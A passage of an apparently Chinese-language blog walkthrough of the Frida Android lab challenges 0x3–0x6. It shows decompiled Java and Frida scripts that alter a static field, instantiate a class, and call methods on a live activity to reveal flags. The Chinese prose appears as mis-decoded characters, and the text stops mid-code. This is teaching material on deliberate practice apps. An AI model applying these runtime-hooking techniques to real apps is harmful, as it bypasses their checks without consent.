ç±»</h3><p>å¯ä»¥çœ‹åˆ°è®¾ç½®äº†ä¸€ä¸ªæŒ‰é’®ç‚¹å‡»ç›‘å¬å™¨ï¼Œå½“ç‚¹å‡»æŒ‰é’®æ—¶ï¼Œä¼šæ£€æŸ¥ <code>Checker.code</code> æ˜¯å¦ä¸º <code>0x200</code>ï¼Œå¦‚æœæ˜¯åˆ™æ˜¾ç¤º flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/ba13423709189d44.png"></p><h3 id="Checker-ç±»"><a href="#Checker-ç±»" class="headerlink" title="Checker ç±»"></a>Checker ç±»</h3><p>åˆ†æ <code>Checker</code> ç±»èƒ½å‘ç°æœ‰ä¸€ä¸ªé™æ€å˜é‡ <code>code</code>ï¼Œå€¼ä¸º 0ï¼Œè¿˜æœ‰ä¸€ä¸ªé™æ€æ–¹æ³• <code>increase()</code> è®© <code>code+2</code>ï¼Œä½†æ˜¯åœ¨ç¨‹åºä¸­å¹¶æ²¡æœ‰è¢«è°ƒç”¨</p><p><img src="https://img.dkdun.cn/v1/2025/12/5083d2738271bf78.png"></p><p>è¿™æ—¶æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼š</p><ol><li>ç›´æ¥ hook <code>Checker</code> ç±»çš„ <code>code</code> å˜é‡ï¼Œå€¼ä¸º <code>0x200</code></li><li>ä¸»åŠ¨è°ƒç”¨ <code>increase()</code> æ–¹æ³•è®© <code>code</code> ç´¯åŠ åˆ° <code>0x200</code></li></ol><h2 id="Hook-1"><a href="#Hook-1" class="headerlink" title="Hook"></a>Hook</h2><h3 id="hook-é™æ€å˜é‡-code"><a href="#hook-é™æ€å˜é‡-code" class="headerlink" title="hook é™æ€å˜é‡ code"></a>hook é™æ€å˜é‡ code</h3><p>ç°åœ¨ hook ä»£ç ä¸­çš„ç±»ä¸å†æ˜¯ <code>MainActivity</code> è€Œæ˜¯ <code>Checker</code> äº†ï¼Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook3</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);<br>   <span class="hljs-title class_">Checker</span>.<span class="hljs-property">code</span>.<span class="hljs-property">value</span>=<span class="hljs-number">0x200</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook3</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main)<br></code></pre></td></tr></table></figure><p>ç‚¹å‡»ä¸€ä¸‹å°±å¾—å‡ºç»“æœ</p><p><img src="https://img.dkdun.cn/v1/2025/12/51528caae6e8f981.png"></p><h3 id="ä¸»åŠ¨è°ƒç”¨-increase-æ–¹æ³•"><a href="#ä¸»åŠ¨è°ƒç”¨-increase-æ–¹æ³•" class="headerlink" title="ä¸»åŠ¨è°ƒç”¨ increase() æ–¹æ³•"></a>ä¸»åŠ¨è°ƒç”¨ increase() æ–¹æ³•</h3><p>å†™ä¸€ä¸ªç®€å•çš„ <code>for</code> å¾ªç¯ï¼Œç´¯åŠ  0x100 æ¬¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook3</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x100</span>;i++)&#123;<br>        <span class="hljs-title class_">Checker</span>.<span class="hljs-title function_">increase</span>();<br>       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;value:&quot;</span>,<span class="hljs-title class_">Checker</span>.<span class="hljs-property">code</span>.<span class="hljs-property">value</span>);<span class="hljs-comment">//å¯ä»¥é€‰æ‹©ä¸æ‰“å°</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook3</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main)<br></code></pre></td></tr></table></figure><p>å½“ç´¯åŠ åˆ° 512 æ—¶å°±å¾—åˆ°ç»“æœ</p><p><img src="https://img.dkdun.cn/v1/2025/12/4468d0ddf458822d.png"></p><h2 id="Conclusion-1"><a href="#Conclusion-1" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>ä¸»è¦æ˜¯å»æ”¹å˜ç±»ä¸­çš„é™æ€å˜é‡çš„å€¼</p><p>Frida æ›´æ”¹å˜é‡å€¼çš„æ¨¡æ¿ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>     <span class="hljs-keyword">var</span> &lt;class_reference&gt; = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(â€œ&lt;package_name&gt;.&lt;<span class="hljs-keyword">class</span>&gt;â€);<br>     &lt;class_reference&gt;.&lt;variable&gt;.<span class="hljs-property">value</span> = &lt;value&gt;; <span class="hljs-comment">//éœ€è¦ä¿®æ”¹çš„å˜é‡</span><br>&#125;)<br></code></pre></td></tr></table></figure><h1 id="Frida-0x4"><a href="#Frida-0x4" class="headerlink" title="Frida 0x4"></a>Frida 0x4</h1><h2 id="è¿è¡Œ-2"><a href="#è¿è¡Œ-2" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><p>ä¹Ÿæ˜¯ä¸€ä¸ªæ²¡æœ‰è¾“å…¥çš„åªæœ‰ä¸€ä¸ªé™æ€é¡µé¢</p><p><img src="https://img.dkdun.cn/v1/2025/12/b2e578f70007aa20.png"></p><h2 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>åç¼–è¯‘çœ‹ä»£ç ï¼Œè¿™æ¬¡ç”¨çš„ Jadx</p><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x4;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    TextView t1;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-built_in">this</span>.t1 = (TextView) findViewById(R.id.txtview);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Check</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x4;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Check</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">get_flag</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> &#123;<br>        <span class="hljs-keyword">if</span> (a == <span class="hljs-number">1337</span>) &#123;<br>            <span class="hljs-type">byte</span>[] decoded = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-string">&quot;I]FKNtW@]JKPFA\\[NALJr&quot;</span>.getBytes().length];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-string">&quot;I]FKNtW@]JKPFA\\[NALJr&quot;</span>.getBytes().length; i++) &#123;<br>                decoded[i] = (<span class="hljs-type">byte</span>) (<span class="hljs-string">&quot;I]FKNtW@]JKPFA\\[NALJr&quot;</span>.getBytes()[i] ^ <span class="hljs-number">15</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decoded);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Check-ç±»"><a href="#Check-ç±»" class="headerlink" title="Check ç±»"></a>Check ç±»</h3><p><code>MainActivity</code> ç±»ä¸­æ²¡å•¥å¥½åˆ†æçš„ï¼Œé‡ç‚¹æ¥åˆ†æ <code>Check</code> ç±»</p><p><code>Check</code> ç±»ä¸­æœ‰ä¸€ä¸ª <code>get_flag</code> æ–¹æ³•ï¼Œå½“ <code>a==1337</code> æ—¶ï¼Œä¼šè¾“å‡ºè§£å¯†çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥å‘ç°ç¨‹åºæ²¡æœ‰å¯¹è¿™ä¸ªæ–¹æ³•è°ƒç”¨ï¼Œå¹¶ä¸”å®ƒä¹Ÿä¸æ˜¯é™æ€æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªæ–¹æ³•çš„å£°æ˜ï¼Œæ‰€ä»¥éœ€è¦å…ˆå®ä¾‹åŒ–ï¼Œå†é€šè¿‡å®ä¾‹å»è°ƒç”¨è¿™ä¸ªæ–¹æ³•è¿”å›ç»“æœ</p><p><img src="https://img.dkdun.cn/v1/2025/12/1a78d2196107b283.png"></p><h2 id="Hook-2"><a href="#Hook-2" class="headerlink" title="Hook"></a>Hook</h2><p>ä½¿ç”¨ <code>$new()</code> å®ä¾‹åŒ– <code>Check</code> ç±»çš„å¯¹è±¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook4</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Check</span> =<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x4.Check&quot;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">CheckObj</span>=<span class="hljs-title class_">Check</span>.$new();<br><span class="hljs-keyword">var</span> result=<span class="hljs-title class_">CheckObj</span>.<span class="hljs-title function_">get_flag</span>(<span class="hljs-number">1337</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title function_">hook4</span>();<br>&#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>ç›´æ¥è¾“å‡ºç»“æœ</p><p><img src="https://img.dkdun.cn/v1/2025/12/005cc375e853f8e1.png"></p><h2 id="Conclusion-2"><a href="#Conclusion-2" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>éé™æ€æ–¹æ³• -&gt; å®ä¾‹åŒ– -&gt; é€šè¿‡å®ä¾‹è°ƒç”¨æ–¹æ³•</p><p>Frida åˆ›å»ºç±»å®ä¾‹çš„æ¨¡æ¿å¦‚ä¸‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><br>  <span class="hljs-keyword">var</span> &lt;class_reference&gt; = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;&lt;package_name&gt;.&lt;class&gt;&quot;</span>);<br>  <span class="hljs-keyword">var</span> &lt;class_instance&gt; = &lt;class_reference&gt;.$new(); <span class="hljs-comment">// åˆ›å»ºç±»çš„å®ä¾‹</span><br>  &lt;class_instance&gt;.&lt;method&gt;(); <span class="hljs-comment">// è°ƒç”¨è¯¥å®ä¾‹ä¸­çš„æ–¹æ³•</span><br><br>&#125;)<br></code></pre></td></tr></table></figure><h1 id="Frida-0x5"><a href="#Frida-0x5" class="headerlink" title="Frida 0x5"></a>Frida 0x5</h1><h2 id="è¿è¡Œ-3"><a href="#è¿è¡Œ-3" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><p>ä¹Ÿæ˜¯ä¸€ä¸ªä»€ä¹ˆéƒ½æ²¡æœ‰çš„é™æ€é¡µé¢</p><p><img src="https://img.dkdun.cn/v1/2025/12/b144d16e1471e3bf.png"></p><h2 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x5;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    TextView t1;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-built_in">this</span>.t1 = (TextView) findViewById(R.id.textview);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flag</span><span class="hljs-params">(<span class="hljs-type">int</span> code)</span> &#123;<br>        <span class="hljs-keyword">if</span> (code == <span class="hljs-number">1337</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-string">&quot;WILLIWOMNKESAWEL&quot;</span>.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>);<br>                <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>                <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">iv</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>]);<br>                cipher.init(<span class="hljs-number">2</span>, secretKeySpec, iv);<br>                <span class="hljs-type">byte</span>[] decodedEnc = Base64.getDecoder().decode(<span class="hljs-string">&quot;2Y2YINP9PtJCS/7oq189VzFynmpG8swQDmH4IC9wKAY=&quot;</span>);<br>                <span class="hljs-type">byte</span>[] decryptedBytes = cipher.doFinal(decodedEnc);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">decryptedText</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decryptedBytes);<br>                <span class="hljs-built_in">this</span>.t1.setText(decryptedText);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="MainActivity-ç±»-2"><a href="#MainActivity-ç±»-2" class="headerlink" title="MainActivity ç±»"></a>MainActivity ç±»</h3><p>æœ‰ä¸€ä¸ª <code>flag</code> æ–¹æ³•ï¼Œä¸ä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œä½†è¿™ä¸€é¢˜æ˜¯  <code>flag</code> æ–¹æ³•åœ¨ <code>MainActivity</code> ç±»é‡Œï¼Œå¹¶ä¸” <code>MainActivity</code> å·²ç»åœ¨åº”ç”¨ç¨‹åºå¯åŠ¨çš„æ—¶å€™å®ä¾‹åŒ–äº†ï¼Œä½¿ç”¨ <code>Java.use</code> è·å– <code>MainActivity</code> ç±»å¹¶è°ƒç”¨ <code>new()</code> åˆ›å»ºå®ä¾‹ä¼šå¯¼è‡´é”™è¯¯ï¼Œæ‰€ä»¥å¯ä»¥è·å– <code>MainActivity</code> çš„å®ä¾‹ï¼Œç„¶åè°ƒç”¨å°±å¯ä»¥äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/365f04385e2b91f9.png"></p><h2 id="Hook-3"><a href="#Hook-3" class="headerlink" title="Hook"></a>Hook</h2><h3 id="åœ¨ç°æœ‰çš„å®ä¾‹ä¸Šè°ƒç”¨æ–¹æ³•"><a href="#åœ¨ç°æœ‰çš„å®ä¾‹ä¸Šè°ƒç”¨æ–¹æ³•" class="headerlink" title="åœ¨ç°æœ‰çš„å®ä¾‹ä¸Šè°ƒç”¨æ–¹æ³•"></a>åœ¨ç°æœ‰çš„å®ä¾‹ä¸Šè°ƒç”¨æ–¹æ³•</h3><p>demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook5</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.ad2001.frida0x5.MainActivity&quot;</span>,&#123;<br><span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">instance</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance);<br>instance.<span class="hljs-title function_">flag</span>(<span class="hljs-number">1337</span>)<br>&#125;,<br><span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;endhook&quot;</span>)<br>&#125;<br>&#125;)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title function_">hook5</span>();<br>&#125;)<br>&#125;<br><br><span class="hljs-built_in">setTimeout</span>(main,<span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p>demo ä¸­ä½¿ç”¨äº†ä¸€äº› API å’Œ å›è°ƒå‡½æ•°ï¼š</p><ul><li><code>Java.choose</code>ï¼šéå† Java å †ï¼Œæšä¸¾æŒ‡å®šç±»çš„æ´»åŠ¨å®ä¾‹ã€‚</li><li><code>onMatch()</code> å›è°ƒå‡½æ•°ï¼šæ¯å½“æ‰¾åˆ°ä¸€ä¸ªå®ä¾‹æ—¶è§¦å‘å®šä¹‰çš„æ“ä½œã€‚</li><li><code>onComplete()</code> å›è°ƒå‡½æ•°ï¼šæ‰§è¡Œä¸€äº›æ¸…ç†å·¥ä½œï¼Œæˆ–è€…æ ¹æ®è¯·æ±‚çš„ç»“æœæ›´æ–°ã€‚</li></ul><p><img src="https://img.dkdun.cn/v1/2025/12/7130cf6add20a96a.png"></p><h2 id="Conclusion-3"><a href="#Conclusion-3" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>å¤§æ¦‚æµç¨‹ï¼šè°ƒç”¨ <code>MainActivity</code> ä¸­çš„éé™æ€æ–¹æ³• -&gt; é€šè¿‡ <code>Java.choose</code> æœç´¢å®ä¾‹å¯¹è±¡ -&gt; é€šè¿‡ <code>onMatch()</code> å›è°ƒè¿›è¡Œ hook é€»è¾‘ -&gt; <code>onComplete()</code> è¿›è¡Œç»“æŸå¤„ç†</p><p>Frida åœ¨ç°æœ‰å®ä¾‹ä¸Šè°ƒç”¨æ–¹æ³•çš„æ¨¡æ¿ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">performNow</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&#x27;&lt;Package&gt;.&lt;class_Name&gt;&#x27;</span>, &#123;<br><span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>) &#123;<br><span class="hljs-comment">// åŒ¹é…åˆ°ç±»å®ä¾‹æ—¶è¿›è¡Œçš„æ“ä½œ</span><br>&#125;,<br><span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-comment">// å®Œæˆæ“ä½œåçš„å›è°ƒå‡½æ•°</span><br>&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>Java.performNow</code> æ˜¯ Frida ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºåœ¨ Java è¿è¡Œæ—¶ç¯å¢ƒä¸­æ‰§è¡Œä»£ç </p><h1 id="Frida-0x6"><a href="#Frida-0x6" class="headerlink" title="Frida 0x6"></a>Frida 0x6</h1><h2 id="è¿è¡Œ-4"><a href="#è¿è¡Œ-4" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><p>è¿˜æ˜¯ä¸€æ ·çš„é™æ€é¡µé¢</p><p><img src="https://img.dkdun.cn/v1/2025/12/d1326b6de17553b3.png"></p><h2 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>MainActivity ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x6;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> java.security.InvalidKeyException;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javax.crypto.BadPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.IllegalBlockSizeException;<br><span class="hljs-keyword">import</span> javax.crypto.NoSuchPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    TextView t1;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span 